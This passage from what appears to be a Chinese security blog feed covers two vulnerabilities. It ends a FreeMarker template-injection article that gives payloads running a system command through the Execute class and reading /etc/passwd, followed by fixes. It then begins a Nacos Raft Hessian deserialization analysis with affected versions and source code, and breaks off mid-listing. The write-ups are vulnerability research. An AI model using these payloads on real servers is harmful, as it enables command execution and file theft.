class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">#assign classLoader=object?api.class.protectionDomain.classLoader&gt; <br>&lt;#assign clazz=classLoader.loadClass(&quot;ClassExposingGSON&quot;)&gt; <br>&lt;#assign field=clazz?api.getField(&quot;GSON&quot;)&gt; <br>&lt;#assign gson=field?api.get(null)&gt; <br>&lt;#assign ex=gson?api.fromJson(&quot;&#123;&#125;&quot;, classLoader.loadClass(&quot;freemarker.template.utility.Execute&quot;))&gt; <br>$&#123;ex(&quot;Calc&quot;&quot;)&#125;<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;#assign is=object?api.class.getResourceAsStream(&quot;/Test.class&quot;)&gt;<br>FILE:[&lt;#list 0..999999999 as _&gt;<br>    &lt;#assign byte=is.read()&gt;<br>    &lt;#if byte == -1&gt;<br>        &lt;#break&gt;<br>    &lt;/#if&gt;<br>$&#123;byte&#125;, &lt;/#list&gt;]<br>&lt;#assign uri=object?api.class.getResource(&quot;/&quot;).toURI()&gt;<br>&lt;#assign input=uri?api.create(&quot;file:///etc/passwd&quot;).toURL().openConnection()&gt;<br>&lt;#assign is=input?api.getInputStream()&gt;<br>FILE:[&lt;#list 0..999999999 as _&gt;<br>    &lt;#assign byte=is.read()&gt;<br>    &lt;#if byte == -1&gt;<br>        &lt;#break&gt;<br>    &lt;/#if&gt;<br>$&#123;byte&#125;, &lt;/#list&gt;]<br></code></pre></td></tr></table></figure><h2 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h2><p>从 <strong>2.3.17</strong>版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：<br>1、UNRESTRICTED_RESOLVER：可以通过 <code>ClassUtil.forName(className)</code> 获取任何类。</p><p>2、SAFER_RESOLVER：不能加载 <code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类。<br>3、ALLOWS_NOTHING_RESOLVER：不能解析任何类。<br>可通过<code>freemarker.core.Configurable#setNewBuiltinClassResolver</code>方法设置<code>TemplateClassResolver</code>，从而限制通过<code>new()</code>函数对<code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类的解析。</p><p>4、当<code>api_builtin_enabled</code>为true时才可使用api函数，而该配置在<strong>2.3.22版本</strong>之后默认为false。</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nacos 内网集群 Raft 反序列化漏洞</title>
    <link href="/2023/06/19/Nacos-%E5%86%85%E7%BD%91%E9%9B%86%E7%BE%A4-Raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/06/19/Nacos-%E5%86%85%E7%BD%91%E9%9B%86%E7%BE%A4-Raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a><strong>一、漏洞描述</strong></h1><p>Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。该漏洞仅影响7848端口（默认设置下），一般使用时该端口为Nacos集群间Raft协议的通信端口，不承载客户端请求，因此老版本可以通过禁止该端口来自Nacos集群外的请求达到止血目的（如部署时已进行限制或未暴露，则风险可控）。<br>漏洞利用实际需要访问到相应端口，实际风险可控。</p><h1 id="二、影响版本"><a href="#二、影响版本" class="headerlink" title="二、影响版本"></a><strong>二、影响版本</strong></h1><p>1.4.0 &lt;&#x3D; Nacos &lt; 1.4.6<br>2.0.0 &lt;&#x3D; Nacos &lt; 2.2.3</p><h1 id="三、漏洞详情"><a href="#三、漏洞详情" class="headerlink" title="三、漏洞详情"></a><strong>三、漏洞详情</strong></h1><h2 id="Nacos-中-Jraft-服务源码解析"><a href="#Nacos-中-Jraft-服务源码解析" class="headerlink" title="Nacos 中 Jraft 服务源码解析"></a>Nacos 中 <strong>Jraft 服务源码解析</strong></h2><p>当 Nacos 使用<strong>嵌入数据源</strong>（ -DembeddedStorage&#x3D;true，每个节点有一个数据源），以<strong>集群</strong>方式启动（-Dnacos.standalone&#x3D;false）时，使用raft协议，来保证数据一致性，并在1.4.1开始使用了sofa-jraft框架。<br>Nacos 内调用 Jraft 流程如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A concrete implementation of CP protocol: JRaft.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * &lt;pre&gt;</span><br><span class="hljs-comment"> *                                           ┌──────────────────────┐</span><br><span class="hljs-comment"> *            ┌──────────────────────┐       │                      ▼</span><br><span class="hljs-comment"> *            │   ProtocolManager    │       │        ┌───────────────────────────┐</span><br><span class="hljs-comment"> *            └──────────────────────┘       │        │for p in [LogProcessor4CP] │</span><br><span class="hljs-comment"> *                        │                  │        └───────────────────────────┘</span><br><span class="hljs-comment"> *                        ▼                  │                      │</span><br><span class="hljs-comment"> *      ┌──────────────────────────────────┐ │                      ▼</span><br><span class="hljs-comment"> *      │    discovery LogProcessor4CP     │ │             ┌─────────────────┐</span><br><span class="hljs-comment"> *      └──────────────────────────────────┘ │             │  get p.group()  │</span><br><span class="hljs-comment"> *                        │                  │             └─────────────────┘</span><br><span class="hljs-comment"> *                        ▼                  │                      │</span><br><span class="hljs-comment"> *                 ┌─────────────┐           │                      │</span><br><span class="hljs-comment"> *                 │ RaftConfig  │           │                      ▼</span><br><span class="hljs-comment"> *                 └─────────────┘           │      ┌──────────────────────────────┐</span><br><span class="hljs-comment"> *                        │                  │      │  create raft group service   │</span><br><span class="hljs-comment"> *                        ▼                  │      └──────────────────────────────┘</span><br><span class="hljs-comment"> *              ┌──────────────────┐         │</span><br><span class="hljs-comment"> *              │  JRaftProtocol   │         │</span><br><span class="hljs-comment"> *              └──────────────────┘         │</span><br><span class="hljs-comment"> *                        │                  │</span><br><span class="hljs-comment"> *                     init()                │</span><br><span class="hljs-comment"> *                        │                  │</span><br><span class="hljs-comment"> *                        ▼                  │</span><br><span class="hljs-comment"> *               ┌─────────────────┐         │</span><br><span class="hljs-comment"> *               │   JRaftServer   │         │</span><br><span class="hljs-comment"> *               └─────────────────┘         │</span><br><span class="hljs-comment"> *                        │                  │</span><br><span class="hljs-comment"> *                        │                  │</span><br><span class="hljs-comment"> *                        ▼                  │</span><br><span class="hljs-comment"> *             ┌────────────────────┐        │</span><br><span class="hljs-comment"> *             │JRaftServer.start() │        │</span><br><span class="hljs-comment"> *             └────────────────────┘        │</span><br><span class="hljs-comment"> *                        │                  │</span><br><span class="hljs-comment"> *                        └──────────────────┘</span><br><span class="hljs-comment"> * &lt;/pre&gt;</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h3 id="ProtocolManager"><a href="#ProtocolManager" class="headerlink" title="ProtocolManager"></a>ProtocolManager</h3><p>com.alibaba.nacos.core.distributed.ProtocolManager 构造方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ProtocolManager</span><span class="hljs-params">(ServerMemberManager memberManager)</span> &#123;<br>    <span class="hljs-built_in">this</span>.memberManager = memberManager;<br>    NotifyCenter.registerSubscriber(<span class="hljs-built_in">this</span>);<br>&#125;<br>    <br></code></pre></td></tr></table></figure><p>此处 ServerMemberManager 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServerMemberManager</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ApplicationListener</span>&lt;WebServerInitializedEvent&gt; &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">NacosAsyncRestTemplate</span> <span class="hljs-variable">asyncRestTemplate</span> <span class="hljs-operator">=</span> HttpClientBeanHolder<br>            .getNacosAsyncRestTemplate(Loggers.CORE);<br><br>    <span class="hljs-comment">//默认服务端口未 8848</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">DEFAULT_SERVER_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-number">8848</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SERVER_PORT_PROPERTY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server.port&quot;</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SPRING_MANAGEMENT_CONTEXT_NAMESPACE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;management&quot;</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">MEMBER_CHANGE_EVENT_QUEUE_SIZE_PROPERTY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;nacos.member-change-event.queue.size&quot;</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">DEFAULT_MEMBER_CHANGE_EVENT_QUEUE_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">128</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isUseAddressServer</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">DEFAULT_TASK_DELAY_TIME</span> <span class="hljs-operator">=</span> <span class="hljs-number">5_000L</span>;<br><br>    ...<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ServerMemberManager</span><span class="hljs-params">(ServletContext servletContext)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-built_in">this</span>.serverList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentSkipListMap</span>&lt;&gt;();<br>        EnvUtil.setContextPath(servletContext.getContextPath());<br>        <span class="hljs-comment">//调用init()</span><br>        init();<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NacosException &#123;<br>        Loggers.CORE.info(<span class="hljs-string">&quot;Nacos-related cluster resource initialization&quot;</span>);<br>        <span class="hljs-built_in">this</span>.port = EnvUtil.getProperty(SERVER_PORT_PROPERTY, Integer.class, DEFAULT_SERVER_PORT);<br>        <span class="hljs-built_in">this</span>.localAddress = InetUtils.getSelfIP() + <span class="hljs-string">&quot;:&quot;</span> + port;<br>        <span class="hljs-comment">//调用至 MemberUtil#singleParse(this.localAddress);</span><br>        <span class="hljs-built_in">this</span>.self = MemberUtil.singleParse(<span class="hljs-built_in">this</span>.localAddress);<br>        <span class="hljs-built_in">this</span>.self.setExtendVal(MemberMetaDataConstants.VERSION, VersionUtils.version);<br>        ...<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>MemberUtil#singleParse(this.localAddress)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">DEFAULT_RAFT_OFFSET_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Member <span class="hljs-title function_">singleParse</span><span class="hljs-params">(String member)</span> &#123;<br>    <span class="hljs-comment">// Nacos default port is 8848</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">defaultPort</span> <span class="hljs-operator">=</span> EnvUtil.getProperty(SERVER_PORT_PROPERTY, Integer.class, DEFAULT_SERVER_PORT);<br>    <span class="hljs-comment">// Set the default Raft port information for securit</span><br>    <br>    <span class="hljs-type">String</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> member;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> defaultPort;<br>    String[] info = InternetAddressUtil.splitIPPortStr(address);<br>    <span class="hljs-keyword">if</span> (info.length &gt; <span class="hljs-number">1</span>) &#123;<br>        address = info[<span class="hljs-number">0</span>];<br>        port = Integer.parseInt(info[<span class="hljs-number">1</span>]);<br>    &#125;<br>    <br>    <span class="hljs-type">Member</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> Member.builder().ip(address).port(port).state(NodeState.UP).build();<br>    Map&lt;String, Object&gt; extendInfo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">4</span>);<br>    <span class="hljs-comment">// The Raft Port information needs to be set by default</span><br><span class="hljs-comment">//Jraft 默认端口7848</span><br>    extendInfo.put(MemberMetaDataConstants.RAFT_PORT, String.valueOf(calculateRaftPort(target)));<br>    extendInfo.put(MemberMetaDataConstants.READY_TO_UPGRADE, <span class="hljs-literal">true</span>);<br>    target.setExtendInfo(extendInfo);<br>    <span class="hljs-keyword">return</span> target;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateRaftPort</span><span class="hljs-params">(Member member)</span> &#123;<br><span class="hljs-comment">//端口为默认端口 -1000 即 7848</span><br>    <span class="hljs-keyword">return</span> member.getPort() - DEFAULT_RAFT_OFFSET_PORT;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="JRaftProtocol"><a href="#JRaftProtocol" class="headerlink" title="JRaftProtocol"></a>JRaftProtocol</h3><p>com.alibaba.nacos.core.distributed.raft.JRaftProtocol</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRaftProtocol</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractConsistencyProtocol</span>&lt;RaftConfig, RequestProcessor4CP&gt;<br>        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CPProtocol</span>&lt;RaftConfig, RequestProcessor4CP&gt; &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">AtomicBoolean</span> <span class="hljs-variable">initialized</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicBoolean</span>(<span class="hljs-literal">false</span>);<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">AtomicBoolean</span> <span class="hljs-variable">shutdowned</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicBoolean</span>(<span class="hljs-literal">false</span>);<br><br>    <span class="hljs-comment">//此处默认为 Hessian 反序列化</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Serializer</span> <span class="hljs-variable">serializer</span> <span class="hljs-operator">=</span> SerializeFactory.getDefault();<br>    <br>    <span class="hljs-keyword">private</span> RaftConfig raftConfig;<br>    <br>    <span class="hljs-keyword">private</span> JRaftServer raftServer;<br>    <br>    <span class="hljs-keyword">private</span> JRaftMaintainService jRaftMaintainService;<br>    <br>    <span class="hljs-keyword">private</span> ServerMemberManager memberManager;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JRaftProtocol</span><span class="hljs-params">(ServerMemberManager memberManager)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-built_in">this</span>.memberManager = memberManager;<br>        <span class="hljs-built_in">this</span>.raftServer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRaftServer</span>();<br>        <span class="hljs-built_in">this</span>.jRaftMaintainService = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRaftMaintainService</span>(raftServer);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>com.alibaba.nacos.consistency.SerializeFactory#getDefault()  获取到HessianSerializer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializeFactory</span> &#123;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">HESSIAN_INDEX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hessian&quot;</span>.toLowerCase();<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;String, Serializer&gt; SERIALIZER_MAP = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">4</span>);<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">defaultSerializer</span> <span class="hljs-operator">=</span> HESSIAN_INDEX;<br>    <br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-type">Serializer</span> <span class="hljs-variable">serializer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianSerializer</span>();<br>        SERIALIZER_MAP.put(HESSIAN_INDEX, serializer);<br>        <span class="hljs-keyword">for</span> (Serializer item : NacosServiceLoader.load(Serializer.class)) &#123;<br>            SERIALIZER_MAP.put(item.name().toLowerCase(), item);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Serializer <span class="hljs-title function_">getDefault</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> SERIALIZER_MAP.get(defaultSerializer);<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Serializer <span class="hljs-title function_">getSerializer</span><span class="hljs-params">(String type)</span> &#123;<br>        <span class="hljs-keyword">return</span> SERIALIZER_MAP.get(type.toLowerCase());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>com.alibaba.nacos.consistency.serialize.HessianSerializer   此处直接为 Hessian 序列化及反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.nacos.consistency.Serializer;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianSerializer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializer</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hessian&quot;</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HessianSerializer</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data)</span> &#123;<br>        <span class="hljs-keyword">return</span> deseiralize0(data);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data, Class&lt;T&gt; cls)</span> &#123;<br>        <span class="hljs-keyword">return</span> deserialize(data);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data, Type type)</span> &#123;<br>        <span class="hljs-keyword">return</span> deserialize(data);<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> &lt;T&gt; T <span class="hljs-title function_">deseiralize0</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data)</span> &#123;<br>        <span class="hljs-keyword">if</span> (ByteUtils.isEmpty(data)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    <br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data));<br>        input.setSerializerFactory(serializerFactory);<br>        Object resultObject;<br>        <span class="hljs-keyword">try</span> &#123;<br>            resultObject = input.readObject();<br>            input.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;IOException occurred when Hessian serializer decode!&quot;</span>, e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> (T) resultObject;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-type">byte</span>[] serialize(T obj) &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(byteArray);<br>        output.setSerializerFactory(serializerFactory);<br>        <span class="hljs-keyword">try</span> &#123;<br>            output.writeObject(obj);<br>            output.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;IOException occurred when Hessian serializer encode!&quot;</span>, e);<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> byteArray.toByteArray();<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">name</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> NAME;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="JRaftServer"><a href="#JRaftServer" class="headerlink" title="JRaftServer"></a>JRaftServer</h3><p>com.alibaba.nacos.core.distributed.raft.JRaftServer#start() 启动RaftServer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 